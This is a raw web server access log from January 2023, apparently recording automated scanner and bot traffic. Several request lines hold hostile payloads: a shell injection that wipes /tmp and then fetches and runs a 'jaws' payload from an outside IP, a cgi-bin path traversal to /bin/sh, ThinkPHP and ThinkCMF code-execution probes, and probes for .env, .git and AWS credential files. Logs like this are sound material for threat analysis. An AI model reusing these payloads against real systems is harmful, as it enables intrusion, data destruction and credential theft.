143.110.222.166 - - [23/Jan/2023:15:06:06 -0600] "GET / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
192.241.195.51 - - [23/Jan/2023:15:27:54 -0600] "GET /hudson HTTP/1.1" 301 238 "-" "Mozilla/5.0 zgrab/0.x"
117.204.158.18 - - [23/Jan/2023:15:37:25 -0600] "POST /HNAP1/ HTTP/1.0" 400 591 "-" "-"
165.227.0.21 - - [23/Jan/2023:15:45:15 -0600] "GET / HTTP/1.0" 301 232 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:98.0) Gecko/20100101 Firefox/98.0"
194.38.20.161 - - [23/Jan/2023:15:49:01 -0600] "GET /administrator/components/com_jinc/classes/graphics/php-ofc-library/ofc_upload_image.php HTTP/1.1" 301 328 "-" "ALittle Client"
143.110.222.166 - - [23/Jan/2023:16:03:37 -0600] "GET / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
162.142.125.9 - - [23/Jan/2023:16:08:20 -0600] "GET / HTTP/1.1" 301 232 "-" "-"
162.142.125.9 - - [23/Jan/2023:16:08:20 -0600] "GET / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
162.142.125.9 - - [23/Jan/2023:16:08:20 -0600] "PRI * HTTP/2.0" 400 226 "-" "-"
205.210.31.56 - - [23/Jan/2023:16:09:58 -0600] "\x16\x03\x01" 400 226 "-" "-"
193.32.162.159 - - [23/Jan/2023:16:47:55 -0600] "GET / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
167.71.235.90 - - [23/Jan/2023:16:51:09 -0600] "\x16\x03\x01" 400 226 "-" "-"
167.71.235.90 - - [23/Jan/2023:16:51:09 -0600] "\x16\x03\x01" 400 226 "-" "-"
167.71.235.90 - - [23/Jan/2023:16:51:10 -0600] "GET / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
205.185.118.237 - - [23/Jan/2023:16:58:57 -0600] "POST /boaform/admin/formLogin HTTP/1.1" 301 255 "http://194.195.210.97:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
143.110.222.166 - - [23/Jan/2023:17:05:10 -0600] "GET / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
180.149.125.159 - - [23/Jan/2023:17:23:51 -0600] "GET /stalker_portal/server/tools/auth_simple.php HTTP/1.1" 301 275 "-" "Mozilla/5.0 (Windows NT 5.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.90 Safari/537.36"
185.254.196.223 - - [23/Jan/2023:17:25:42 -0600] "GET /.env HTTP/1.1" 301 236 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
185.254.196.223 - - [23/Jan/2023:17:25:43 -0600] "POST / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
156.206.242.10 - - [23/Jan/2023:17:26:34 -0600] "GET /shell?cd+/tmp;rm+-rf+*;wget+137.175.17.190/jaws;sh+/tmp/jaws HTTP/1.1" 301 292 "-" "Hello, world"
162.243.151.24 - - [23/Jan/2023:17:30:04 -0600] "MGLNDD_194.195.210.97_80\n" 400 226 "-" "-"
192.241.213.65 - - [23/Jan/2023:17:48:26 -0600] "GET /actuator/health HTTP/1.1" 301 247 "-" "Mozilla/5.0 zgrab/0.x"
138.68.208.16 - - [23/Jan/2023:17:48:27 -0600] "GET /portal/redlion HTTP/1.1" 301 246 "-" "Mozilla/5.0 zgrab/0.x"
193.35.18.224 - - [23/Jan/2023:17:51:03 -0600] "CONNECT google.com:443 HTTP/1.1" 301 232 "-" "Go-http-client/1.1"
143.110.222.166 - - [23/Jan/2023:18:02:31 -0600] "GET / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
23.251.102.74 - - [23/Jan/2023:18:05:39 -0600] "GET /Telerik.Web.UI.WebResource.axd?type=rau HTTP/1.1" 301 271 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
152.89.196.211 - - [23/Jan/2023:18:15:34 -0600] "POST /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 301 282 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
193.32.162.159 - - [23/Jan/2023:18:44:52 -0600] "GET / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
152.89.196.211 - - [23/Jan/2023:18:54:21 -0600] "GET /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 301 282 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
143.110.222.166 - - [23/Jan/2023:19:02:58 -0600] "GET / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
152.89.196.211 - - [23/Jan/2023:19:11:58 -0600] "GET /solr/admin/info/system?wt=json HTTP/1.1" 301 262 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
106.75.230.132 - - [23/Jan/2023:19:33:20 -0600] "GET / HTTP/1.1" 301 232 "-" "-"
51.254.59.113 - - [23/Jan/2023:19:47:17 -0600] "GET / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36"
152.89.196.211 - - [23/Jan/2023:19:59:52 -0600] "GET /index.php?s=/Index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=HelloThinkPHP21 HTTP/1.1" 301 356 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
143.110.222.166 - - [23/Jan/2023:20:09:31 -0600] "GET / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
152.89.196.211 - - [23/Jan/2023:20:17:51 -0600] "GET /?a=fetch&content=<php>die(@md5(HelloThinkCMF))</php> HTTP/1.1" 301 300 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
185.254.196.223 - - [23/Jan/2023:20:26:09 -0600] "GET /.env HTTP/1.1" 301 236 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
185.254.196.223 - - [23/Jan/2023:20:26:10 -0600] "POST / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
179.43.177.242 - - [23/Jan/2023:20:34:34 -0600] "POST /boaform/admin/formLogin HTTP/1.1" 301 255 "http://194.195.210.97:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
37.139.128.90 - - [23/Jan/2023:20:36:22 -0600] "GET / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (Linux; U; Android 4.4.2; en-US; HM NOTE 1W Build/KOT49H) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/11.0.5.850 U3/0.8.0 Mobile Safari/534.30"
37.139.128.90 - - [23/Jan/2023:20:36:23 -0600] "GET /.env HTTP/1.1" 301 236 "-" "Mozilla/5.0 (Linux; U; Android 4.4.2; en-US; HM NOTE 1W Build/KOT49H) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/11.0.5.850 U3/0.8.0 Mobile Safari/534.30"
37.139.128.90 - - [23/Jan/2023:20:36:24 -0600] "POST / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (Linux; U; Android 4.4.2; en-US; HM NOTE 1W Build/KOT49H) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/11.0.5.850 U3/0.8.0 Mobile Safari/534.30"
37.139.128.90 - - [23/Jan/2023:20:36:28 -0600] "GET /_profiler/phpinfo HTTP/1.1" 301 249 "-" "Mozilla/5.0 (Linux; U; Android 4.4.2; en-US; HM NOTE 1W Build/KOT49H) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/11.0.5.850 U3/0.8.0 Mobile Safari/534.30"
37.139.128.90 - - [23/Jan/2023:20:36:29 -0600] "GET /debug/default/view?panel=config HTTP/1.1" 301 263 "-" "Mozilla/5.0 (Linux; U; Android 4.4.2; en-US; HM NOTE 1W Build/KOT49H) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/11.0.5.850 U3/0.8.0 Mobile Safari/534.30"
37.139.128.90 - - [23/Jan/2023:20:36:29 -0600] "GET /.git/config HTTP/1.1" 301 243 "-" "Mozilla/5.0 (Linux; U; Android 4.4.2; en-US; HM NOTE 1W Build/KOT49H) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/11.0.5.850 U3/0.8.0 Mobile Safari/534.30"
152.89.196.211 - - [23/Jan/2023:20:37:44 -0600] "GET /?XDEBUG_SESSION_START=phpstorm HTTP/1.1" 301 262 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
92.118.39.82 - - [23/Jan/2023:20:52:07 -0600] "GET / HTTP/1.1" 301 232 "-" "-"
143.110.222.166 - - [23/Jan/2023:21:07:07 -0600] "GET / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
177.222.112.89 - - [23/Jan/2023:21:13:06 -0600] "GET /robots.txt HTTP/1.1" 301 251 "-" "Mozilla/5.0 (Linux; Android 5.0; SM-G900P Build/LRX21T) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Mobile Safari/537.36"
35.165.245.211 - - [23/Jan/2023:21:22:09 -0600] "GET / HTTP/1.1" 301 241 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.97 Safari/537.36"
54.213.12.98 - - [23/Jan/2023:21:22:31 -0600] "GET /favicon.ico HTTP/1.1" 301 252 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.97 Safari/537.36"
54.213.12.98 - - [23/Jan/2023:21:22:32 -0600] "GET / HTTP/1.1" 301 241 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.97 Safari/537.36"
179.43.177.242 - - [23/Jan/2023:21:24:54 -0600] "GET / HTTP/1.1" 301 232 "-" "Hello World"
152.89.196.211 - - [23/Jan/2023:21:32:01 -0600] "GET /console/ HTTP/1.1" 301 240 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
195.154.77.190 - - [23/Jan/2023:21:40:22 -0600] "POST /boaform/admin/formLogin HTTP/1.1" 301 255 "http://194.195.210.97:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
152.89.196.211 - - [23/Jan/2023:21:48:51 -0600] "POST /Autodiscover/Autodiscover.xml HTTP/1.1" 301 261 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
143.110.222.166 - - [23/Jan/2023:22:08:12 -0600] "GET / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
205.185.118.237 - - [23/Jan/2023:22:10:08 -0600] "POST /boaform/admin/formLogin HTTP/1.1" 301 255 "http://194.195.210.97:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
152.89.196.211 - - [23/Jan/2023:22:10:35 -0600] "GET /_ignition/execute-solution HTTP/1.1" 301 258 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
179.43.155.157 - - [23/Jan/2023:22:19:21 -0600] "POST /boaform/admin/formLogin HTTP/1.1" 301 255 "http://194.195.210.97:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
185.224.128.219 - - [23/Jan/2023:22:21:40 -0600] "GET /.git/config HTTP/1.1" 301 243 "-" "python-requests/2.22.0"
46.101.38.78 - - [23/Jan/2023:22:33:33 -0600] "\x16\x03\x01" 400 226 "-" "-"
46.101.38.78 - - [23/Jan/2023:22:33:33 -0600] "\x16\x03\x01" 400 226 "-" "-"
46.101.38.78 - - [23/Jan/2023:22:33:33 -0600] "GET / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
167.248.133.60 - - [23/Jan/2023:22:41:18 -0600] "GET / HTTP/1.1" 301 232 "-" "-"
167.248.133.60 - - [23/Jan/2023:22:41:19 -0600] "GET / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
167.248.133.60 - - [23/Jan/2023:22:41:19 -0600] "PRI * HTTP/2.0" 400 226 "-" "-"
107.170.240.16 - - [23/Jan/2023:22:43:58 -0600] "GET /ReportServer HTTP/1.1" 301 244 "-" "Mozilla/5.0 zgrab/0.x"
152.89.196.211 - - [23/Jan/2023:22:45:41 -0600] "GET / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
152.89.196.211 - - [23/Jan/2023:22:54:45 -0600] "POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1" 400 226 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
143.110.222.166 - - [23/Jan/2023:23:06:53 -0600] "GET / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
193.56.29.26 - - [23/Jan/2023:23:18:34 -0600] "HEAD / HTTP/1.1" 301 - "-" "Mozilla/5.0 (Linux; U; Android 4.4.2; en-US; HM NOTE 1W Build/KOT49H) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/11.0.5.850 U3/0.8.0 Mobile Safari/534.30"
193.56.29.26 - - [23/Jan/2023:23:18:34 -0600] "GET /.env HTTP/1.1" 301 236 "-" "Mozilla/5.0 (Linux; U; Android 4.4.2; en-US; HM NOTE 1W Build/KOT49H) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/11.0.5.850 U3/0.8.0 Mobile Safari/534.30"
193.56.29.26 - - [23/Jan/2023:23:18:34 -0600] "POST / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (Linux; U; Android 4.4.2; en-US; HM NOTE 1W Build/KOT49H) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/11.0.5.850 U3/0.8.0 Mobile Safari/534.30"
185.254.196.223 - - [23/Jan/2023:23:25:37 -0600] "GET /.env HTTP/1.1" 301 236 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
185.254.196.223 - - [23/Jan/2023:23:25:37 -0600] "POST / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
152.89.196.211 - - [23/Jan/2023:23:41:24 -0600] "GET / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
198.199.95.35 - - [23/Jan/2023:23:46:22 -0600] "GET / HTTP/1.1" 301 232 "-" "Mozilla/5.0 zgrab/0.x"
152.89.196.211 - - [23/Jan/2023:23:57:03 -0600] "GET /actuator/gateway/routes HTTP/1.1" 301 255 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
80.82.78.27 - - [24/Jan/2023:00:55:42 -0600] "\x03" 400 226 "-" "-"
143.110.222.166 - - [24/Jan/2023:01:03:42 -0600] "GET / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
205.185.118.237 - - [24/Jan/2023:01:09:02 -0600] "POST /boaform/admin/formLogin HTTP/1.1" 301 255 "http://194.195.210.97:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
64.62.197.222 - - [24/Jan/2023:01:30:41 -0600] "GET / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.102 Safari/537.36 OPR/90.0.4480.84"
64.62.197.218 - - [24/Jan/2023:01:31:20 -0600] "GET / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36"
64.62.197.218 - - [24/Jan/2023:01:31:57 -0600] "GET /favicon.ico HTTP/1.1" 301 243 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:103.0) Gecko/20100101 Firefox/103.0"
125.19.39.57 - - [24/Jan/2023:01:35:40 -0600] "GET /v1/agent/self HTTP/1.1\n" 400 226 "-" "-"
162.221.192.26 - - [24/Jan/2023:01:47:42 -0600] "GET / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
37.44.238.168 - - [24/Jan/2023:01:57:51 -0600] "POST /boaform/admin/formLogin HTTP/1.1" 301 255 "http://194.195.210.97:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
143.110.222.166 - - [24/Jan/2023:02:06:51 -0600] "GET / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
34.78.6.216 - - [24/Jan/2023:02:10:28 -0600] "GET / HTTP/1.1" 301 232 "-" "python-requests/2.28.2"
185.254.196.223 - - [24/Jan/2023:02:25:29 -0600] "GET /.env HTTP/1.1" 301 236 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
185.254.196.223 - - [24/Jan/2023:02:25:30 -0600] "POST / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
83.23.153.40 - - [24/Jan/2023:02:45:40 -0600] "GET / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
143.110.222.166 - - [24/Jan/2023:03:03:22 -0600] "GET / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
167.99.141.170 - - [24/Jan/2023:03:06:59 -0600] "GET / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:79.0) Gecko/20100101 Firefox/79.0"
179.43.177.242 - - [24/Jan/2023:03:19:01 -0600] "POST /boaform/admin/formLogin HTTP/1.1" 301 255 "http://194.195.210.97:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
103.47.218.74 - - [24/Jan/2023:03:25:34 -0600] "GET / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36"
185.224.128.219 - - [24/Jan/2023:03:26:53 -0600] "GET /admin/config.php HTTP/1.1" 301 248 "-" "python-requests/2.22.0"
85.25.177.176 - - [24/Jan/2023:03:45:00 -0600] "GET / HTTP/1.1" 301 241 "-" "Mozilla/5.0 (compatible; seocompany/0.6; +; )"
85.25.177.176 - - [24/Jan/2023:03:45:00 -0600] "GET / HTTP/1.1" 301 241 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:103.0) Gecko/20100101 Firefox/103.0"
109.237.98.53 - - [24/Jan/2023:03:47:21 -0600] "GET /.env HTTP/1.1" 301 245 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
109.237.98.53 - - [24/Jan/2023:03:47:22 -0600] "POST /.env HTTP/1.1" 301 245 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
109.237.98.53 - - [24/Jan/2023:03:47:22 -0600] "GET /.aws/credentials HTTP/1.1" 301 257 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
109.237.98.53 - - [24/Jan/2023:03:47:23 -0600] "POST /.aws/credentials HTTP/1.1" 301 257 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
109.237.98.53 - - [24/Jan/2023:03:47:23 -0600] "GET /.aws/config HTTP/1.1" 301 252 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
109.237.98.53 - - [24/Jan/2023:03:47:23 -0600] "POST /.aws/config HTTP/1.1" 301 252 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
109.237.98.53 - - [24/Jan/2023:03:47:24 -0600] "GET /aws/credentials HTTP/1.1" 301 256 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
109.237.98.53 - - [24/Jan/2023:03:47:24 -0600] "POST /aws/credentials HTTP/1.1" 301 256 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
109.237.98.53 - - [24/Jan/2023:03:47:25 -0600] "GET /credentials HTTP/1.1" 301 252 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
109.237.98.53 - - [24/Jan/2023:03:47:25 -0600] "POST /credentials HTTP/1.1" 301 252 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
109.237.98.53 - - [24/Jan/2023:03:47:25 -0600] "GET /test.php HTTP/1.1" 301 249 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
109.237.98.53 - - [24/Jan/2023:03:47:26 -0600] "POST /test.php HTTP/1.1" 301 249 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
109.237.98.53 - - [24/Jan/2023:03:47:26 -0600] "GET /laravel/.env HTTP/1.1" 301 253 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
109.237.98.53 - - [24/Jan/2023:03:47:26 -0600] "POST /laravel/.env HTTP/1.1" 301 253 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
109.237.98.53 - - [24/Jan/2023:03:47:27 -0600] "GET /demo/.env HTTP/1.1" 301 250 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
109.237.98.53 - - [24/Jan/2023:03:47:27 -0600] "POST /demo/.env HTTP/1.1" 301 250 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
109.237.98.53 - - [24/Jan/2023:03:47:27 -0600] "GET /web/.env HTTP/1.1" 301 249 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
109.237.98.53 - - [24/Jan/2023:03:47:28 -0600] "POST /web/.env HTTP/1.1" 301 249 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
109.237.98.53 - - [24/Jan/2023:03:47:28 -0600] "GET /phpinfo HTTP/1.1" 301 248 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
109.237.98.53 - - [24/Jan/2023:03:47:28 -0600] "POST /phpinfo HTTP/1.1" 301 248 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
179.43.177.242 - - [24/Jan/2023:03:56:18 -0600] "GET / HTTP/1.1" 301 232 "-" "Hello World"
143.110.222.166 - - [24/Jan/2023:04:05:35 -0600] "GET / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
92.118.39.82 - - [24/Jan/2023:04:47:02 -0600] "GET / HTTP/1.1" 301 232 "-" "-"
143.110.222.166 - - [24/Jan/2023:05:01:59 -0600] "GET / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
185.180.143.18 - - [24/Jan/2023:05:24:26 -0600] "GET / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
185.180.143.18 - - [24/Jan/2023:05:24:33 -0600] "GET /solr/ HTTP/1.1" 301 237 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
